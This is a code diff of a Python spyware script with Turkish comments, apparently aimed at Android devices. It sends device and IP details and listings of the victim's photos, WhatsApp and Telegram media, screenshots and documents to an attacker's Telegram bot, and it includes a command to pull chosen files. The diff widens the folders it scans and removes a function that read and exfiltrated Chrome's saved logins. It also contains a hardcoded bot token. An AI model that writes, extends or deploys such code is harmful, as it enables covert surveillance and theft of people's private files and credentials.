@@ -2,9 +2,7 @@ import os
 import json
 import time
 import requests
-import telegram
 from telegram.ext import Updater, CommandHandler
-import sqlite3
 
 # Telegram Bot Ayarları
 BOT_TOKEN = "7990420796:AAEqVI1L0WiGL8l66L_njVYvgnaC2vNbL6Y"
@@ -56,50 +54,50 @@ def cihaz_bilgisi_al():
         bilgiler["Hata"] = "Bazı bilgiler alınamadı!"
     return bilgiler
 
-def chrome_sifreleri_al():
-    sifreler = []
-    login_data_path = "/data/data/com.android.chrome/app_chrome/Default/Login Data"
-    try:
-        if os.path.exists(login_data_path):
-            conn = sqlite3.connect(login_data_path)
-            cursor = conn.cursor()
-            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-            for row in cursor.fetchall():
-                url, username, password = row
-                sifreler.append({
-                    "URL": url,
-                    "Kullanıcı Adı": username,
-                    "Şifre": "Şifreli (AES, çözülemedi)"
-                })
-            conn.close()
-        else:
-            sifreler.append({"Hata": "Login Data dosyasına erişilemedi, root gerekli!"})
-    except:
-        sifreler.append({"Hata": "Chrome şifreleri alınamadı, root veya izin eksik!"})
-    return sifreler
-
 def dosya_tara():
     klasorler = {
         "Download": "/sdcard/Download",
         "Pictures": "/sdcard/Pictures",
         "Movies": "/sdcard/Movies",
-        "Documents": "/sdcard/Documents"
+        "Documents": "/sdcard/Documents",
+        "WhatsApp Media": "/sdcard/WhatsApp/Media",
+        "DCIM": "/sdcard/DCIM",
+        "Music": "/sdcard/Music",
+        "Telegram": "/sdcard/Telegram",
+        "Screenshots": "/sdcard/Pictures/Screenshots",
+        "Recordings": "/sdcard/Recordings",
+        "Bluetooth": "/sdcard/Bluetooth"
     }
     dosya_listesi = {}
     global dosya_haritasi
     dosya_haritasi = {}
     sayac = 1
+    medya_uzantilari = [".jpg", ".png"]  # Boyut sınırı olmayanlar
+    diger_uzantilari = [".pdf", ".docx", ".txt", ".zip", ".mp4"]  # Boyut sınırı olanlar
+    min_boyut = 1024 * 1024  # 1MB sınır (diğer uzantılar için)
+    
     for klasor, yol in klasorler.items():
         dosya_listesi[klasor] = []
         try:
             for root, _, files in os.walk(yol):
                 for dosya in files:
                     tam_yol = os.path.join(root, dosya)
-                    dosya_listesi[klasor].append({f"[{sayac}]": dosya})
-                    dosya_haritasi[str(sayac)] = tam_yol
-                    sayac += 1
-        except:
-            dosya_listesi[klasor].append({"Hata": f"{klasor} taranamadı!"})
+                    try:
+                        dosya_boyutu = os.path.getsize(tam_yol)
+                        # JPG ve PNG için boyut sınırı yok
+                        if any(dosya.lower().endswith(uzanti) for uzanti in medya_uzantilari):
+                            dosya_listesi[klasor].append({f"[{sayac}]": dosya})
+                            dosya_haritasi[str(sayac)] = tam_yol
+                            sayac += 1
+                        # Diğer uzantılar için 1MB sınırı
+                        elif any(dosya.lower().endswith(uzanti) for uzanti in diger_uzantilari) and dosya_boyutu >= min_boyut:
+                            dosya_listesi[klasor].append({f"[{sayac}]": dosya})
+                            dosya_haritasi[str(sayac)] = tam_yol
+                            sayac += 1
+                    except:
+                        continue
+        except Exception as e:
+            dosya_listesi[klasor].append({"Hata": f"{klasor} taranamadı: {str(e)}"})
     return dosya_listesi
 
 def bilgileri_kaydet_ve_gonder():
@@ -132,7 +130,6 @@ def bilgileri_kaydet_ve_gonder():
     )
     requests.post(TELEGRAM_MESSAGE_API, data={"chat_id": CHAT_ID, "text": cihaz_mesaji})
     print("Cihaz ve IP bilgisi mesaj olarak gönderildi!")
-
     dosya_listesi = dosya_tara()
     dosya_dosyasi = f"dosyalar_{zaman_damgasi}.json"
     with open(dosya_dosyasi, "w") as f:
@@ -141,15 +138,6 @@ def bilgileri_kaydet_ve_gonder():
     with open(dosya_dosyasi, "rb") as f:
         requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID}, files={"document": f})
     print(f"{dosya_dosyasi} Telegram'a gönderildi!")
-
-    chrome_sifreleri = chrome_sifreleri_al()
-    sifre_dosyasi = f"chrome_sifreler_{zaman_damgasi}.json"
-    with open(sifre_dosyasi, "w") as f:
-        json.dump(chrome_sifreleri, f, indent=4, ensure_ascii=False)
-    print(f"Chrome şifreleri {sifre_dosyasi} kaydedildi!")
-    with open(sifre_dosyasi, "rb") as f:
-        requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID}, files={"document": f})
-    print(f"{sifre_dosyasi} Telegram'a gönderildi!")
 
 def select_file(update, context):
     try:
@@ -165,7 +153,7 @@ def select_file(update, context):
         update.message.reply_text("Hata, dosya gönderilemedi!")
 
 def main():
-    print("Botu başlatıyorum, kral! 😈")
+    print("Bot Running.")
     updater = Updater(BOT_TOKEN, use_context=True)
     dp = updater.dispatcher
     dp.add_handler(CommandHandler("select", select_file, pass_args=True))
